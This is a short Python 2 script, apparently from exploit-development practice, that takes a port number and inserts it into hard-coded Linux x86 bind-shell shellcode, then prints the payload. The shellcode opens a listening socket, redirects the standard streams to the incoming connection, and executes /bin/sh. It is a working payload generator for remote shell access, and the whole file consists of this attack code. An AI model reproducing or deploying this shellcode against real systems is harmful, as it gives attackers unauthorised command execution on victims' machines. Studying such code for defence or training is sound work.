#!/usr/bin/python

#usage: ./wrapper <portNumber>

import sys

port = int(sys.argv[1])  

#restrict for ports lower than 1024 which would require sudo for binding and for higher than max port nr
if port < 1024 or port > 65535:
   print "Provide a port between 1024 and 65535"
   exit()	

# convert port to network byte by converting to hex and then reverse
port = format(port, '04x')  
port = "\\x" + str(port[2:4]) + "\\x" + str(port[0:2])  

shellcode ="\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x6a\\x66\\x58\\x56\\x66\\x68" + port + "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x6a\\x66\\x58\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80"

print "Shellcode: " + shellcode
